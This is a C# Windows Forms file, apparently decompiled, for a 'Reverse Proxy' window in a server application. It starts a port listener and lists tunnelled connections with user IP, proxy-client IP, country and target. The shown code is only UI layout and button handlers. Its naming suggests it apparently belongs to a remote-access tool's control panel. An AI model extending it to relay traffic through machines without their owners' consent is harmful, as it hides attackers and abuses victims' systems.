using System;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.Net.Sockets;
using System.Windows.Forms;
using DevExpress.Utils;
using DevExpress.XtraBars;
using DevExpress.XtraEditors;
using DevExpress.XtraEditors.Controls;
using DevExpress.XtraGrid;
using DevExpress.XtraGrid.Columns;
using DevExpress.XtraGrid.Views.Base;
using DevExpress.XtraGrid.Views.Grid;
using DevExpress.XtraTab;
using Server.Connection;
using Server.Handle_Packet;
using Server.ReverseProxy;

namespace Server.Forms;

public class FormReverseProxy : XtraForm
{
	private object _lock = new object();

	private IContainer components;

	private Label lblLocalServerPort;

	public SimpleButton btnStop;

	public SimpleButton btnStart;

	private SpinEdit nudServerPort;

	private PopupMenu popupMenuConntections;

	private BarButtonItem CloseConnectionMenu;

	private BarManager barManager1;

	private BarDockControl barDockControlTop;

	private BarDockControl barDockControlBottom;

	private BarDockControl barDockControlLeft;

	private BarDockControl barDockControlRight;

	private GridControl gridControlConnections;

	private GridView gridViewConnections;

	private GridColumn UserIPColumn;

	private GridColumn UserCountryColumn;

	private GridColumn ProxyIPColumn;

	private GridColumn ProxyCountryColumn;

	private GridColumn TargetColumn;

	private GridColumn ProxyTypeColumn;

	private GridColumn ReceivedColumn;

	private GridColumn SentColumn;

	private XtraTabControl xtraTabControl1;

	private XtraTabPage xtraTabPage1;

	private PanelControl panelControl1;

	private Clients ProxyClient => _reverseProxyHandler.CommunicationClient;

	private HandleReverseProxy _reverseProxyHandler => Program.ReverseProxyHandler;

	public FormReverseProxy()
	{
		InitializeComponent();
	}

	private ushort GetPortSafe()
	{
		if (ushort.TryParse(nudServerPort.Value.ToString(CultureInfo.InvariantCulture), out var result))
		{
			return result;
		}
		return 0;
	}

	private void ToggleConfigurationButtons(bool started)
	{
		btnStart.Enabled = !started;
		nudServerPort.Enabled = !started;
		btnStop.Enabled = started;
	}

	private void btnStart_Click(object sender, EventArgs e)
	{
		try
		{
			ushort portSafe = GetPortSafe();
			if (portSafe == 0)
			{
				MessageBox.Show("Please enter a valid port > 0.", "Please enter a valid port", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				return;
			}
			new HandleLogs().Addmsg($"Reverse Proxy is working on {ProxyClient.Ip}:{portSafe}...", Color.Blue);
			_reverseProxyHandler.StartReverseProxyServer(portSafe);
			ToggleConfigurationButtons(started: true);
		}
		catch (SocketException ex)
		{
			if (ex.ErrorCode == 10048)
			{
				MessageBox.Show("The port is already in use.", "Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				MessageBox.Show($"An unexpected socket error occurred: {ex.Message}\n\nError Code: {ex.ErrorCode}", "Unexpected Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
		catch (Exception ex2)
		{
			MessageBox.Show("An unexpected error occurred: " + ex2.Message, "Unexpected Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void btnStop_Click(object sender, EventArgs e)
	{
		ToggleConfigurationButtons(started: false);
		_reverseProxyHandler.StopReverseProxyServer();
		new HandleLogs().Addmsg("Stopped Reverse Proxy on " + ProxyClient.Ip + "...", Color.Blue);
	}

	private void nudServerPort_ValueChanged(object sender, EventArgs e)
	{
	}

	private void FormReverseProxy_Load(object sender, EventArgs e)
	{
	}

	private void FormReverseProxy_FormClosing(object sender, FormClosingEventArgs e)
	{
		_reverseProxyHandler.ExitProxy();
	}

	public void OnReport(ReverseProxyClient[] OpenConnections)
	{
		lock (_lock)
		{
			gridControlConnections.DataSource = OpenConnections;
		}
	}

	private void CloseConnectionMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		int[] selectedRows = gridViewConnections.GetSelectedRows();
		foreach (int index in selectedRows)
		{
			_reverseProxyHandler.CloseConnection(index);
		}
	}

	private void lstConnections_MouseUp(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			popupMenuConntections.ShowPopup(gridControlConnections.PointToScreen(e.Location));
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormReverseProxy));
		this.lblLocalServerPort = new System.Windows.Forms.Label();
		this.nudServerPort = new DevExpress.XtraEditors.SpinEdit();
		this.btnStop = new DevExpress.XtraEditors.SimpleButton();
		this.btnStart = new DevExpress.XtraEditors.SimpleButton();
		this.gridControlConnections = new DevExpress.XtraGrid.GridControl();
		this.gridViewConnections = new DevExpress.XtraGrid.Views.Grid.GridView();
		this.UserIPColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.UserCountryColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.ProxyIPColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.ProxyCountryColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.ProxyTypeColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.TargetColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.ReceivedColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.SentColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.barManager1 = new DevExpress.XtraBars.BarManager(this.components);
		this.barDockControlTop = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlBottom = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlLeft = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlRight = new DevExpress.XtraBars.BarDockControl();
		this.CloseConnectionMenu = new DevExpress.XtraBars.BarButtonItem();
		this.popupMenuConntections = new DevExpress.XtraBars.PopupMenu(this.components);
		this.panelControl1 = new DevExpress.XtraEditors.PanelControl();
		this.xtraTabControl1 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage1 = new DevExpress.XtraTab.XtraTabPage();
		((System.ComponentModel.ISupportInitialize)this.nudServerPort.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridControlConnections).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewConnections).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.barManager1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuConntections).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.panelControl1).BeginInit();
		this.panelControl1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).BeginInit();
		this.xtraTabControl1.SuspendLayout();
		this.xtraTabPage1.SuspendLayout();
		base.SuspendLayout();
		this.lblLocalServerPort.AutoSize = true;
		this.lblLocalServerPort.Location = new System.Drawing.Point(5, 10);
		this.lblLocalServerPort.Name = "lblLocalServerPort";
		this.lblLocalServerPort.Size = new System.Drawing.Size(89, 13);
		this.lblLocalServerPort.TabIndex = 0;
		this.lblLocalServerPort.Text = "Local Server Port";
		this.nudServerPort.EditValue = new decimal(new int[4] { 3128, 0, 0, 0 });
		this.nudServerPort.Location = new System.Drawing.Point(101, 3);
		this.nudServerPort.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.nudServerPort.Name = "nudServerPort";
		this.nudServerPort.Properties.Buttons.AddRange(new DevExpress.XtraEditors.Controls.EditorButton[1]
		{
			new DevExpress.XtraEditors.Controls.EditorButton(DevExpress.XtraEditors.Controls.ButtonPredefines.Combo)
		});
		this.nudServerPort.Size = new System.Drawing.Size(86, 28);
		this.nudServerPort.TabIndex = 10;
		this.btnStop.Dock = System.Windows.Forms.DockStyle.Right;
		this.btnStop.Location = new System.Drawing.Point(822, 2);
		this.btnStop.Name = "btnStop";
		this.btnStop.Size = new System.Drawing.Size(160, 30);
		this.btnStop.TabIndex = 9;
		this.btnStop.Text = "Stop Listening";
		this.btnStop.Click += new System.EventHandler(btnStop_Click);
		this.btnStart.Dock = System.Windows.Forms.DockStyle.Right;
		this.btnStart.Location = new System.Drawing.Point(662, 2);
		this.btnStart.Name = "btnStart";
		this.btnStart.Size = new System.Drawing.Size(160, 30);
		this.btnStart.TabIndex = 8;
		this.btnStart.Text = "Start Listening";
		this.btnStart.Click += new System.EventHandler(btnStart_Click);
		this.gridControlConnections.Dock = System.Windows.Forms.DockStyle.Fill;
		this.gridControlConnections.Location = new System.Drawing.Point(0, 0);
		this.gridControlConnections.MainView = this.gridViewConnections;
		this.gridControlConnections.MenuManager = this.barManager1;
		this.gridControlConnections.Name = "gridControlConnections";
		this.gridControlConnections.Size = new System.Drawing.Size(982, 519);
		this.gridControlConnections.TabIndex = 8;
		this.gridControlConnections.ViewCollection.AddRange(new DevExpress.XtraGrid.Views.Base.BaseView[1] { this.gridViewConnections });
		this.gridControlConnections.MouseUp += new System.Windows.Forms.MouseEventHandler(lstConnections_MouseUp);
		this.gridViewConnections.Columns.AddRange(new DevExpress.XtraGrid.Columns.GridColumn[8] { this.UserIPColumn, this.UserCountryColumn, this.ProxyIPColumn, this.ProxyCountryColumn, this.ProxyTypeColumn, this.TargetColumn, this.ReceivedColumn, this.SentColumn });
		this.gridViewConnections.GridControl = this.gridControlConnections;
		this.gridViewConnections.Name = "gridViewConnections";
		this.gridViewConnections.OptionsView.ShowGroupPanel = false;
		this.UserIPColumn.Caption = "UserIP";
		this.UserIPColumn.FieldName = "UserIP";
		this.UserIPColumn.Name = "UserIPColumn";
		this.UserIPColumn.OptionsColumn.AllowEdit = false;
		this.UserIPColumn.Visible = true;
		this.UserIPColumn.VisibleIndex = 0;
		this.UserCountryColumn.Caption = "UserCountry";
		this.UserCountryColumn.FieldName = "UserCountry";
		this.UserCountryColumn.Name = "UserCountryColumn";
		this.UserCountryColumn.OptionsColumn.AllowEdit = false;
		this.UserCountryColumn.Visible = true;
		this.UserCountryColumn.VisibleIndex = 1;
		this.ProxyIPColumn.Caption = "ProxyIp";
		this.ProxyIPColumn.FieldName = "ClientIP";
		this.ProxyIPColumn.Name = "ProxyIPColumn";
		this.ProxyIPColumn.OptionsColumn.AllowEdit = false;
		this.ProxyIPColumn.Visible = true;
		this.ProxyIPColumn.VisibleIndex = 2;
		this.ProxyCountryColumn.Caption = "ProxyCountry";
		this.ProxyCountryColumn.FieldName = "ClientCountry";
		this.ProxyCountryColumn.Name = "ProxyCountryColumn";
		this.ProxyCountryColumn.OptionsColumn.AllowEdit = false;
		this.ProxyCountryColumn.Visible = true;
		this.ProxyCountryColumn.VisibleIndex = 3;
		this.ProxyTypeColumn.Caption = "Type";
		this.ProxyTypeColumn.FieldName = "TypeStr";
		this.ProxyTypeColumn.Name = "ProxyTypeColumn";
		this.ProxyTypeColumn.OptionsColumn.AllowEdit = false;
		this.ProxyTypeColumn.Visible = true;
		this.ProxyTypeColumn.VisibleIndex = 4;
		this.TargetColumn.Caption = "Target";
		this.TargetColumn.FieldName = "TargetStr";
		this.TargetColumn.Name = "TargetColumn";
		this.TargetColumn.OptionsColumn.AllowEdit = false;
		this.TargetColumn.Visible = true;
		this.TargetColumn.VisibleIndex = 5;
		this.ReceivedColumn.Caption = "Received";
		this.ReceivedColumn.FieldName = "ReceivedStr";
		this.ReceivedColumn.Name = "ReceivedColumn";
		this.ReceivedColumn.OptionsColumn.AllowEdit = false;
		this.ReceivedColumn.Visible = true;
		this.ReceivedColumn.VisibleIndex = 6;
		this.SentColumn.Caption = "Sent";
		this.SentColumn.FieldName = "SendStr";
		this.SentColumn.Name = "SentColumn";
		this.SentColumn.OptionsColumn.AllowEdit = false;
		this.SentColumn.Visible = true;
		this.SentColumn.VisibleIndex = 7;
		this.barManager1.DockControls.Add(this.barDockControlTop);
		this.barManager1.DockControls.Add(this.barDockControlBottom);
		this.barManager1.DockControls.Add(this.barDockControlLeft);
		this.barManager1.DockControls.Add(this.barDockControlRight);
		this.barManager1.Form = this;
		this.barManager1.Items.AddRange(new DevExpress.XtraBars.BarItem[1] { this.CloseConnectionMenu });
		this.barManager1.MaxItemId = 1;
		this.barDockControlTop.CausesValidation = false;
		this.barDockControlTop.Dock = System.Windows.Forms.DockStyle.Top;
		this.barDockControlTop.Location = new System.Drawing.Point(0, 0);
		this.barDockControlTop.Manager = this.barManager1;
		this.barDockControlTop.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlTop.Size = new System.Drawing.Size(984, 0);
		this.barDockControlBottom.CausesValidation = false;
		this.barDockControlBottom.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.barDockControlBottom.Location = new System.Drawing.Point(0, 584);
		this.barDockControlBottom.Manager = this.barManager1;
		this.barDockControlBottom.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlBottom.Size = new System.Drawing.Size(984, 0);
		this.barDockControlLeft.CausesValidation = false;
		this.barDockControlLeft.Dock = System.Windows.Forms.DockStyle.Left;
		this.barDockControlLeft.Location = new System.Drawing.Point(0, 0);
		this.barDockControlLeft.Manager = this.barManager1;
		this.barDockControlLeft.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlLeft.Size = new System.Drawing.Size(0, 584);
		this.barDockControlRight.CausesValidation = false;
		this.barDockControlRight.Dock = System.Windows.Forms.DockStyle.Right;
		this.barDockControlRight.Location = new System.Drawing.Point(984, 0);
		this.barDockControlRight.Manager = this.barManager1;
		this.barDockControlRight.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlRight.Size = new System.Drawing.Size(0, 584);
		this.CloseConnectionMenu.Caption = "Close Connection";
		this.CloseConnectionMenu.Id = 0;
		this.CloseConnectionMenu.Name = "CloseConnectionMenu";
		this.CloseConnectionMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(CloseConnectionMenu_ItemClick);
		this.popupMenuConntections.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[1]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.CloseConnectionMenu)
		});
		this.popupMenuConntections.Manager = this.barManager1;
		this.popupMenuConntections.Name = "popupMenuConntections";
		this.panelControl1.Controls.Add(this.btnStart);
		this.panelControl1.Controls.Add(this.nudServerPort);
		this.panelControl1.Controls.Add(this.lblLocalServerPort);
		this.panelControl1.Controls.Add(this.btnStop);
		this.panelControl1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panelControl1.Location = new System.Drawing.Point(0, 550);
		this.panelControl1.Name = "panelControl1";
		this.panelControl1.Size = new System.Drawing.Size(984, 34);
		this.panelControl1.TabIndex = 13;
		this.xtraTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl1.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControl1.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl1.Name = "xtraTabControl1";
		this.xtraTabControl1.SelectedTabPage = this.xtraTabPage1;
		this.xtraTabControl1.Size = new System.Drawing.Size(984, 550);
		this.xtraTabControl1.TabIndex = 14;
		this.xtraTabControl1.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage1 });
		this.xtraTabPage1.Controls.Add(this.gridControlConnections);
		this.xtraTabPage1.Name = "xtraTabPage1";
		this.xtraTabPage1.Size = new System.Drawing.Size(982, 519);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(984, 584);
		base.Controls.Add(this.xtraTabControl1);
		base.Controls.Add(this.panelControl1);
		base.Controls.Add(this.barDockControlLeft);
		base.Controls.Add(this.barDockControlRight);
		base.Controls.Add(this.barDockControlBottom);
		base.Controls.Add(this.barDockControlTop);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FormReverseProxy.IconOptions.Icon");
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormReverseProxy.IconOptions.Image");
		base.Name = "FormReverseProxy";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Reverse Proxy";
		base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(FormReverseProxy_FormClosing);
		base.Load += new System.EventHandler(FormReverseProxy_Load);
		((System.ComponentModel.ISupportInitialize)this.nudServerPort.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridControlConnections).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewConnections).EndInit();
		((System.ComponentModel.ISupportInitialize)this.barManager1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuConntections).EndInit();
		((System.ComponentModel.ISupportInitialize)this.panelControl1).EndInit();
		this.panelControl1.ResumeLayout(false);
		this.panelControl1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).EndInit();
		this.xtraTabControl1.ResumeLayout(false);
		this.xtraTabPage1.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
